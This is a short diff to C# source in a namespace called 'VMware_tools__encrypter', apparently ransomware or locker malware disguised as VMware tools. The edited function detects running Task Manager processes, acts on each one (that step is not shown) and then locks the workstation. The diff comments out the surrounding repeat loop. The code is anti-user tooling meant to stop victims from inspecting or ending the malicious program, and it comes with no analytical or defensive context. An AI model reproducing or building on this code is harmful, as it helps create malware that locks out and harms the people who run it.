@@ -414,8 +414,8 @@ namespace VMware_tools__encrypter
             Thread thread = new Thread(threadStart);
             void Calculate()
             {
-                while (lll == true)
-                {
+              //  while (lll == true)
+               // {
                     if (System.Diagnostics.Process.GetProcessesByName("taskmgr").ToList().Count > 0)
                     {
                         foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcessesByName("taskmgr"))
@@ -424,7 +424,7 @@ namespace VMware_tools__encrypter
                         }
                         LockWorkStation();
 
-                    }
+                 //   }
                 }
 
             }
